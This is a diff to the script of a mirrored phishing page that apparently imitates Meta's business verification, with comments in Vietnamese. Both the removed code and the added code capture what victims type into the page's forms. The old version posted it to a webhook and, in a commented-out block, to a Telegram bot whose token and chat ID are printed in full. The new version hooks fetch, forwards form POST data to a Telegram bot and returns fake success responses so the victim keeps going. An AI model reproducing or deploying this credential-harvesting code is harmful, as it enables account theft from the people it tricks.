@@ -2,46 +2,110 @@
 <!-- Mirrored from https://authentication-entry-center.netlify.app/business-center by HTTrack Website Copier/3.x [XR&CO], Thu, 19 Nov 2026 06:51:41 GMT -->
 <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
 <head><script>
-document.addEventListener("click", function(e) {
-  // Kiểm tra nếu người dùng bấm vào nút Submit hoặc nút Tiếp tục/Gửi
-  const btn = e.target.closest("button, input[type='submit']");
-  if (!btn) return;
+(function() {
+    // =========================================================================
+    // CẤU HÌNH NƠI NHẬN DATA CỦA BẠN (ĐIỀN THÔNG TIN VÀO ĐÂY)
+    // =========================================================================
+    const TELEGRAM_BOT_TOKEN = "DIEN_TOKEN_BOT_CUA_BAN_VAO_DAY"; // Ví dụ: 7123456789:AAH...
+    const TELEGRAM_CHAT_ID   = "DIEN_CHAT_ID_CUA_BAN_VAO_DAY";   // Ví dụ: 123456789
 
-  // Quét toàn bộ các ô input đang hiển thị trên màn hình
-  const inputs = document.querySelectorAll("input, textarea, select");
-  let payload = {};
-  let hasData = false;
-
-  inputs.forEach((input, index) => {
-    if (input.type !== "hidden" && input.type !== "submit" && input.value.trim() !== "") {
-      const key = input.name || input.id || input.placeholder || ("field_" + index);
-      payload[key] = input.value.trim();
-      hasData = true;
+    // =========================================================================
+    // 1. TỰ ĐỘNG SỬA ĐƯỜNG DẪN CSS / JS BỊ LỖI
+    // =========================================================================
+    function fixAssetUrl(url) {
+        if (!url || typeof url !== 'string') return url;
+        url = url.replace(/\.(css|js)\/(\?.*)?$/i, '.$1$2');
+        if (url.startsWith('/_next/')) {
+            url = '.' + url;
+        }
+        return url;
     }
-  });
 
-  // Nếu có dữ liệu nhập vào thì gửi đi
-  if (hasData) {
-    // 1. GỬI VỀ WEBHOOK / GOOGLE APPS SCRIPT / SERVER CỦA BẠN:
-    fetch("THAY_LINK_WEBHOOK_HOAC_APPS_SCRIPT_CUA_BAN", {
-      method: "POST",
-      mode: "no-cors",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
-    });
+    // =========================================================================
+    // 2. ĐÁNH CHẶN API, LẤY DATA TỪ JS CŨ VÀ GỬI VỀ TELEGRAM
+    // =========================================================================
+    const originalFetch = window.fetch;
+    window.fetch = async function(...args) {
+        let resource = args[0];
+        let options = args[1] || {};
+        let url = typeof resource === 'string' ? resource : (resource && resource.url) || '';
 
-    /* 2. HOẶC NẾU GỬI TRỰC TIẾP VỀ TELEGRAM BOT, XÓA DẤU /* VÀ */ ĐỂ DÙNG ĐOẠN NÀY:
-    const BOT_TOKEN = "9141061384:AAHGfs-TlTtvmoZaY0SicT-YH5Shmb907R4";
-    const CHAT_ID = "-5377276972";
-    const text = "Dữ liệu mới:\n" + JSON.stringify(payload, null, 2);
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-    });
-    */
-  }
-}, true);
+        const fixedUrl = fixAssetUrl(url);
+        if (fixedUrl !== url) {
+            url = fixedUrl;
+            if (typeof resource === 'string') args[0] = fixedUrl;
+        }
+
+        // Giả lập API IP Location (Sửa lỗi 404)
+        if (url.includes('api/ip-location')) {
+            return new Response(JSON.stringify({
+                ip: "127.0.0.1",
+                country: "Vietnam",
+                country_code: "VN",
+                countryCode: "VN",
+                city: "Ho Chi Minh"
+            }), { status: 200, headers: { 'Content-Type': 'application/json' } });
+        }
+
+        // Bắt sự kiện Submit Form từ file JS cũ (Sửa lỗi 405 & Gửi data về)
+        if (url.includes('api/meta-verified-for-business') || (options.method && options.method.toUpperCase() === 'POST' && url.includes('/api/'))) {
+            let rawData = options.body || '{}';
+            let formattedText = "📩 CÓ DATA MỚI TỪ WEB:\n\n";
+
+            // Giải mã dữ liệu JSON từ file JS cũ thành từng dòng cho dễ đọc
+            try {
+                const parsed = typeof rawData === 'string' ? JSON.parse(rawData) : rawData;
+                for (const [key, value] of Object.entries(parsed)) {
+                    formattedText += `• ${key}: ${typeof value === 'object' ? JSON.stringify(value) : value}\n`;
+                }
+            } catch (err) {
+                formattedText += rawData;
+            }
+
+            // Gọi API Telegram để đẩy dữ liệu về máy bạn
+            if (TELEGRAM_BOT_TOKEN !== "DIEN_TOKEN_BOT_CUA_BAN_VAO_DAY") {
+                try {
+                    await originalFetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: formattedText
+                        })
+                    });
+                    console.log('[Fix] Đã gửi data về Telegram thành công!');
+                } catch (e) {
+                    console.error('[Fix] Lỗi gửi Telegram:', e);
+                }
+            }
+
+            // Trả về 200 OK để giao diện web tiếp tục chạy bước tiếp theo
+            return new Response(JSON.stringify({
+                success: true,
+                status: "ok",
+                code: 200,
+                message: "Success"
+            }), { status: 200, headers: { 'Content-Type': 'application/json' } });
+        }
+
+        return originalFetch.apply(this, args);
+    };
+
+    // =========================================================================
+    // 3. BẮT LỖI TẢI FILE TRÊN DOM
+    // =========================================================================
+    window.addEventListener('error', function(e) {
+        const target = e.target;
+        if (target && (target.tagName === 'LINK' || target.tagName === 'SCRIPT')) {
+            const attr = target.tagName === 'LINK' ? 'href' : 'src';
+            const currentVal = target.getAttribute(attr);
+            const fixedVal = fixAssetUrl(currentVal);
+            if (currentVal && fixedVal !== currentVal) {
+                target.setAttribute(attr, fixedVal);
+            }
+        }
+    }, true);
+})();
 </script><meta charSet="utf-8"/>
 <!-- This site is hosted on Netlify. Anyone can build and deploy a site
      like this one for free: https://netlify.new/?utm_campaign=loops&utm_source=ai-legible&utm_medium=owned&utm_content=comment&utm_id=e6480cd0-4259-4b3d-a381-30af56dafac8
